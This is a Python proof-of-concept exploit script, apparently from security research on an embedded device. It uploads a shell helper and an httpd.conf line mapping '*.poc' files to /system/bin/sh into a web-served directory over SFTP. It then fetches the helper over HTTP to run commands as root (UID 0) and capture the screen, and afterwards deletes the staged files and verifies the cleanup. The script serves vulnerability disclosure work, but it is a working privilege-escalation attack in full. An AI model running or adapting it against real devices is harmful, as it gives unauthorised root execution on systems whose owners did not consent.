#!/usr/bin/env python3
"""Stage a fixed temporary root identity/screenshot helper, then remove its endpoint."""
import argparse
import hashlib
import json
from pathlib import Path
import re
import socket
import struct
import subprocess
import sys
import tempfile
import time
import uuid
import zlib

from common import port_arg, timeout_arg
from sftp_device import Device, quote

ROOT = '/mnt/tmp/httproot/SWUpgrades/'
PNG_LIMIT = 8 * 1024 * 1024


def parse_http(raw):
    headers, separator, body = raw.partition(b'\r\n\r\n')
    if not separator or len(headers) > 8192:
        raise ValueError('Missing/oversized HTTP headers')
    lines = headers.split(b'\r\n')
    match = re.fullmatch(rb'HTTP/1\.[01] ([0-9]{3})[^\r\n]*', lines[0])
    if not match:
        raise ValueError('Invalid HTTP status line')
    fields = {}
    for line in lines[1:]:
        name, colon, value = line.partition(b':')
        name = name.lower()
        if not colon or name in fields:
            raise ValueError('Malformed or duplicate HTTP header')
        fields[name] = value.strip()
    if b'transfer-encoding' in fields:
        raise ValueError('Unsupported HTTP transfer encoding')
    if b'content-length' in fields:
        value = fields[b'content-length']
        if not value.isdigit() or int(value) != len(body):
            raise ValueError('HTTP content-length mismatch')
    return int(match[1]), body


def http_get(host, port, path, timeout, byte_limit=65536):
    # Host validated by Device before any request; paths are generated internally.
    if not re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9.:%_-]*', host):
        raise ValueError('Expected a plain host name or address')
    if not re.fullmatch(r'/[A-Za-z0-9_./-]+', path):
        raise ValueError('Invalid helper URL path')
    authority = f'[{host}]' if ':' in host else host
    request = f'GET {path} HTTP/1.0\r\nHost: {authority}:{port}\r\nConnection: close\r\n\r\n'.encode('ascii')
    deadline = time.monotonic() + timeout
    result = bytearray()
    with socket.create_connection((host, port), timeout) as sock:
        sock.settimeout(max(0.001, deadline - time.monotonic()))
        sock.sendall(request)
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError('HTTP total deadline exceeded')
            sock.settimeout(remaining)
            chunk = sock.recv(min(65536, byte_limit + 1 - len(result)))
            if not chunk:
                break
            result.extend(chunk)
            if len(result) > byte_limit:
                raise ValueError('HTTP response byte budget exceeded')
    return parse_http(result)


def parse_identity(body):
    uid = re.findall(rb'^POC_UID=([0-9]+)$', body, re.M)
    gid = re.findall(rb'^POC_GID=([0-9]+)$', body, re.M)
    if uid != [b'0'] or gid != [b'0']:
        raise ValueError('Helper did not report exactly one UID/GID 0 identity')
    return {'uid': 0, 'gid': 0}


def validate_png(data):
    if len(data) > PNG_LIMIT or data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError('Invalid/oversized PNG')
    offset, dimensions, have_data = 8, None, False
    while offset + 12 <= len(data):
        count, = struct.unpack_from('>I', data, offset)
        end = offset + count + 12
        if end > len(data):
            raise ValueError('Truncated PNG chunk')
        kind = data[offset+4:offset+8]
        payload = data[offset+8:end-4]
        crc, = struct.unpack_from('>I', data, end-4)
        if zlib.crc32(kind + payload) != crc:
            raise ValueError('PNG CRC mismatch')
        if dimensions is None:
            if kind != b'IHDR' or count != 13:
                raise ValueError('Expected PNG IHDR')
            width, height = struct.unpack_from('>II', payload)
            if (width, height) != (800, 480):
                raise ValueError('Unexpected display dimensions; expected 800x480')
            dimensions = {'width': width, 'height': height}
        elif kind == b'IHDR':
            raise ValueError('Duplicate PNG header')
        if kind == b'IDAT':
            have_data = True
        if kind == b'IEND':
            if count or end != len(data) or not have_data:
                raise ValueError('Invalid PNG end/data')
            return dimensions
        offset = end
    raise ValueError('Missing PNG end')


def helper_source(remote, operation):
    if operation not in ('identity', 'screenshot') or not re.fullmatch(re.escape(ROOT)+r'poc_[0-9a-f]{32}', remote):
        raise ValueError('Unsupported helper operation or staging directory')
    script = (f'cd {remote} || exit 1\numask 022\n'
              "printf 'Content-Type: text/plain\\r\\n\\r\\n'\n"
              "printf 'POC_UID='; /system/bin/busybox id -u\n"
              "printf 'POC_GID='; /system/bin/busybox id -g\n")
    if operation == 'screenshot':
        script += ('/system/bin/timeout -s KILL 5 /system/bin/screencap -p screen.png || exit 1\n'
                   '/system/bin/chmod 0644 screen.png || exit 1\n'
                   "printf 'POC_CAPTURE_OK\\n'\n")
    return script


def cleanup(device, host, port, url, remote, timeout, uncertain):
    errors = []
    # Remove execution mapping before touching artifacts or waiting for a capture.
    try:
        device.batch([f'-rm {quote(remote + "/httpd.conf")}'])
    except (OSError, RuntimeError, subprocess.TimeoutExpired) as exc:
        errors.append(str(exc))
    if uncertain:
        time.sleep(6)  # Capture has a five-second device-side kill deadline.
    try:
        device.batch([f'-rm {quote(remote + "/" + name)}' for name in ('helper.poc', 'screen.png')]
                     + [f'rmdir {quote(remote)}'])
    except (OSError, RuntimeError, subprocess.TimeoutExpired) as exc:
        errors.append(str(exc))
    try:
        status, _ = http_get(host, port, url, timeout)
        if status != 404:
            errors.append('Former helper endpoint did not return HTTP 404')
    except (OSError, ValueError) as exc:
        errors.append(str(exc))
    if errors:
        raise RuntimeError(f'Cleanup unverified for {remote}: ' + '; '.join(errors))


def run_probe(device, host, port, timeout, operation):
    remote = ROOT + 'poc_' + uuid.uuid4().hex
    url = remote.removeprefix('/mnt/tmp/httproot') + '/helper.poc'
    # Recovery path printed before staging; never execute user-provided shell text.
    print(json.dumps({'temporary_directory': remote}), file=sys.stderr, flush=True)
    with tempfile.TemporaryDirectory(prefix='element-root-poc-') as directory:
        local = Path(directory)
        (local/'helper.poc').write_text(helper_source(remote, operation), encoding='ascii')
        (local/'httpd.conf').write_text('*.poc:/system/bin/sh\n', encoding='ascii')
        try:
            device.batch([f'mkdir {quote(remote)}'])
        except (OSError, RuntimeError, subprocess.TimeoutExpired) as exc:
            # Ownership is unconfirmed if mkdir failed or timed out; do not delete a possible existing directory.
            raise RuntimeError(f'Staging creation unconfirmed; inspect {remote} before retrying') from exc
        uncertain = False
        failure = None
        try:
            # Config is uploaded last, so an executable endpoint never precedes its helper.
            device.batch([f'put {quote(local/name)} {quote(remote+"/"+name)}'
                          for name in ('helper.poc', 'httpd.conf')])
            uncertain = True
            status, body = http_get(host, port, url, timeout)
            if status != 200:
                raise ValueError(f'Helper HTTP status {status}')
            result = parse_identity(body)
            if operation == 'screenshot':
                if body.splitlines().count(b'POC_CAPTURE_OK') != 1:
                    raise ValueError('Screenshot completion not reported')
                uncertain = False
                path = local/'screen.png'
                device.batch([f'get {quote(remote+"/screen.png")} {quote(path)}'])
                with path.open('rb') as file:
                    image = file.read(PNG_LIMIT+1)
                result.update(validate_png(image))
                result['png'] = image
            else:
                uncertain = False
        except BaseException as exc:
            failure = exc
        finally:
            try:
                cleanup(device, host, port, url, remote, timeout, uncertain)
            except (OSError, ValueError, RuntimeError) as exc:
                if failure:
                    raise RuntimeError(f'Probe failed ({failure}); {exc}') from failure
                raise
        if failure:
            raise failure
    result['cleanup_verified'] = True
    return result


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--host', required=True)
    parser.add_argument('--key', required=True)
    parser.add_argument('--known-hosts', required=True)
    parser.add_argument('--ssh-port', type=port_arg, default=22)
    parser.add_argument('--http-port', type=port_arg, default=8080)
    parser.add_argument('--timeout', type=timeout_arg, default=10, help='Per-SFTP-batch / total-HTTP deadline')
    parser.add_argument('--legacy-rsa', action='store_true')
    sub = parser.add_subparsers(dest='operation', required=True)
    sub.add_parser('identity')
    capture = sub.add_parser('screenshot')
    capture.add_argument('--output', type=Path, required=True, help='New PNG file; existing files are never overwritten')
    args = parser.parse_args()
    try:
        if args.operation == 'screenshot' and args.output.exists():
            raise ValueError('Output already exists')
        device = Device(args.host, args.key, args.known_hosts, args.ssh_port, args.timeout, args.legacy_rsa)
        result = run_probe(device, args.host, args.http_port, args.timeout, args.operation)
        if args.operation == 'screenshot':
            image = result.pop('png')
            with args.output.open('xb') as file:
                file.write(image)
            result.update({'output': str(args.output), 'bytes': len(image), 'sha256': hashlib.sha256(image).hexdigest()})
    except (OSError, ValueError, RuntimeError, subprocess.TimeoutExpired) as exc:
        print(json.dumps({'state': 'error', 'error': str(exc)}), file=sys.stderr)
        return 1
    print(json.dumps(result, indent=2, allow_nan=False))
    return 0


if __name__ == '__main__':
    sys.exit(main())
